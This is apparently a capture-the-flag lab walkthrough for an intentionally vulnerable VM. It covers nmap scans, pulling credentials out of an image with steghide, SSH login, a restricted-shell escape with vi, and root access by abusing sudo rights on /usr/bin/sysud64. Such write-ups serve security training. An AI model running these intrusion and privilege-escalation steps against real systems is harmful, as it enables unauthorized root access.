

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Steghide extract credentials from picture
[+] Escape restricted shell with vi
[+] Privilege Escalation Abusing SUDO rights -  sysud64 - 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for pumpkins.local (192.168.56.104)
Host is up (0.00082s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE VERSION
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
|_http-title:    Website By Unknowndevice64   
MAC Address: 08:00:27:36:D1:DD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop


Nmap scan report for pumpkins.local (192.168.56.104)
Host is up (0.000089s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
1337/tcp  open  waste
31337/tcp open  Elite
MAC Address: 08:00:27:36:D1:DD (Oracle VirtualBox virtual NIC)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to http://192.168.56.104/31337 we found a hint to the hidden key file

Getting the file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    wget http://192.168.56.104:31337/key_is_h1dd3n.jpg
--2019-10-21 08:55:01--  http://192.168.56.104:31337/key_is_h1dd3n.jpg
Connecting to 192.168.56.104:31337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5386 (5.3K) [image/jpeg]
Saving to: ‘key_is_h1dd3n.jpg’

key_is_h1dd3n.jpg   100%[===================>]   5.26K  --.-KB/s    in 0s      

2019-10-21 08:55:01 (330 MB/s) - ‘key_is_h1dd3n.jpg’ saved [5386/5386]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Extracting the secret from file, using password h1d33n + tool: steghide

Credentials :
Username : ud64
Password : 1M!#64@ud

Logging into the server:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh ud64@192.168.56.104 -p 1337
ud64@192.168.56.104's password: 
Last login: Mon Dec 31 08:37:58 2018 from 192.168.56.101
ud64@unknowndevice64_v1:~$ whoami; id
ud64
uid=1000(ud64) gid=1000(ud64) groups=1000(ud64)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Escaping restricted shell with vi +  export PATH and SHELL

Privilege escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.4$ sudo -l
User ud64 may run the following commands on unknowndevice64_v1:
    (ALL) NOPASSWD: /usr/bin/sysud64

bash-4.4$ sudo /usr/bin/sysud64 -o /dev/null /bin/sh
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
